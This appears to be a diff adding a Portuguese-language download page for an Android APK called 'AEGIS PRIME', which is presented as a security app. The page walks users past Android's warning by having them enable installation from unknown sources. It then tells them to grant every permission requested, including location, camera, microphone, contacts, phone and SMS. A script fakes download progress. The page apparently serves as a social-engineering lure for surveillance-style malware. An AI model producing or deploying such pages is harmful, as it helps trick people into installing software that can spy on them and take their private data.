@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instalar AEGIS PRIME</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #fff;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(15, 23, 42, 0.95);
+            border: 3px solid #00d4ff;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 60px rgba(0, 212, 255, 0.5);
+        }
+
+        .logo {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 30px;
+            background: linear-gradient(135deg, #dc2626, #991b1b);
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 64px;
+            box-shadow: 0 0 30px rgba(220, 38, 38, 0.6);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #dc2626, #ef4444);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            color: #94a3b8;
+            font-size: 14px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-bottom: 40px;
+        }
+
+        .install-btn {
+            background: linear-gradient(135deg, #00d4ff, #0891b2);
+            color: #000;
+            border: none;
+            border-radius: 15px;
+            padding: 20px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.5);
+            margin-bottom: 20px;
+        }
+
+        .install-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 40px rgba(0, 212, 255, 0.7);
+        }
+
+        .install-btn:active {
+            transform: translateY(0);
+        }
+
+        .install-btn .icon {
+            font-size: 28px;
+        }
+
+        .status {
+            background: rgba(0, 212, 255, 0.1);
+            border: 2px solid #00d4ff;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .status-title {
+            color: #00d4ff;
+            font-size: 13px;
+            font-weight: bold;
+            margin-bottom: 12px;
+            letter-spacing: 1.5px;
+        }
+
+        .status-info {
+            color: #cbd5e1;
+            font-size: 15px;
+            line-height: 1.8;
+        }
+
+        .instructions {
+            background: rgba(234, 179, 8, 0.1);
+            border: 2px solid #eab308;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: left;
+        }
+
+        .instructions-title {
+            color: #eab308;
+            font-size: 13px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            letter-spacing: 1.5px;
+            text-align: center;
+        }
+
+        .instructions ol {
+            color: #cbd5e1;
+            font-size: 14px;
+            line-height: 2;
+            margin-left: 20px;
+        }
+
+        .instructions li {
+            margin-bottom: 10px;
+        }
+
+        .instructions li strong {
+            color: #fff;
+        }
+
+        .progress {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(0, 212, 255, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00d4ff, #0891b2);
+            width: 0%;
+            transition: width 0.3s ease;
+            animation: loading 2s infinite;
+        }
+
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+
+        .download-status {
+            color: #00d4ff;
+            font-size: 14px;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+
+        .warning {
+            background: rgba(220, 38, 38, 0.1);
+            border: 2px solid #dc2626;
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 20px;
+            color: #fca5a5;
+            font-size: 13px;
+            text-align: left;
+        }
+
+        .warning strong {
+            color: #dc2626;
+            display: block;
+            margin-bottom: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🛡️</div>
+
+        <h1>AEGIS PRIME</h1>
+        <p class="subtitle">Sistema de Segurança</p>
+
+        <div class="status">
+            <div class="status-title">📦 PACOTE DE INSTALAÇÃO</div>
+            <div class="status-info">
+                <strong>Versão:</strong> 3.0.0 (Build 20260131)<br>
+                <strong>Tamanho:</strong> ~75 MB<br>
+                <strong>Compatibilidade:</strong> Android 8.0+
+            </div>
+        </div>
+
+        <a href="/aegis-prime.apk"
+           class="install-btn"
+           id="installBtn"
+           download="aegis-prime.apk">
+            <span class="icon">📥</span>
+            <span>INSTALAR AGORA</span>
+        </a>
+
+        <div class="progress" id="progress">
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="download-status">Preparando download...</div>
+        </div>
+
+        <div class="instructions">
+            <div class="instructions-title">⚠️ INSTRUÇÕES DE INSTALAÇÃO</div>
+            <ol>
+                <li>Toque no botão <strong>"INSTALAR AGORA"</strong></li>
+                <li>Aguarde o download completar <strong>(~75 MB)</strong></li>
+                <li>Abra o arquivo baixado <strong>aegis-prime.apk</strong></li>
+                <li>Se aparecer aviso de segurança:
+                    <ul style="margin-top: 8px; margin-left: 20px;">
+                        <li>Vá em <strong>Configurações</strong></li>
+                        <li>Procure por <strong>"Instalar apps desconhecidos"</strong></li>
+                        <li>Habilite para o navegador que você está usando</li>
+                        <li>Volte e toque no APK novamente</li>
+                    </ul>
+                </li>
+                <li>Toque em <strong>"Instalar"</strong></li>
+                <li>Aguarde a instalação completar</li>
+                <li>Toque em <strong>"Abrir"</strong> ou procure o app instalado</li>
+                <li><strong>IMPORTANTE:</strong> Conceda TODAS as permissões solicitadas</li>
+            </ol>
+        </div>
+
+        <div class="warning">
+            <strong>🔒 PERMISSÕES NECESSÁRIAS</strong>
+            O app precisa de acesso a: Localização, Câmera, Microfone, Armazenamento, Contatos, Telefone e SMS para funcionar corretamente.
+        </div>
+    </div>
+
+    <script>
+        const installBtn = document.getElementById('installBtn');
+        const progress = document.getElementById('progress');
+
+        installBtn.addEventListener('click', function(e) {
+            console.log('Download iniciado');
+
+            // Mostrar progresso
+            progress.style.display = 'block';
+
+            // Atualizar texto do botão
+            installBtn.innerHTML = '<span class="icon">⏳</span><span>BAIXANDO...</span>';
+            installBtn.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+            installBtn.style.pointerEvents = 'none';
+
+            // Simular progresso (o download real acontece em background)
+            setTimeout(() => {
+                progress.querySelector('.download-status').innerText = 'Download em andamento... (~75 MB)';
+            }, 1000);
+
+            setTimeout(() => {
+                progress.querySelector('.download-status').innerText = 'Download concluído! Verifique suas notificações.';
+                installBtn.innerHTML = '<span class="icon">✅</span><span>DOWNLOAD COMPLETO!</span>';
+            }, 5000);
+
+            // Restaurar botão após 10 segundos
+            setTimeout(() => {
+                installBtn.innerHTML = '<span class="icon">📥</span><span>INSTALAR AGORA</span>';
+                installBtn.style.background = 'linear-gradient(135deg, #00d4ff, #0891b2)';
+                installBtn.style.pointerEvents = 'auto';
+                progress.style.display = 'none';
+            }, 10000);
+        });
+
+        // Detectar se é Android
+        const isAndroid = /Android/i.test(navigator.userAgent);
+        if (!isAndroid) {
+            document.querySelector('.warning').innerHTML = `
+                <strong>⚠️ ATENÇÃO</strong>
+                Este aplicativo é compatível apenas com Android. Você parece estar usando outro sistema operacional.
+            `;
+        }
+
+        // Forçar download com tipo MIME correto
+        installBtn.addEventListener('click', function(e) {
+            // Criar um elemento <a> invisível para forçar download
+            const link = document.createElement('a');
+            link.href = '/aegis-prime.apk';
+            link.download = 'aegis-prime.apk';
+            link.type = 'application/vnd.android.package-archive';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            e.preventDefault();
+        }, true);
+    </script>
+</body>
+</html>
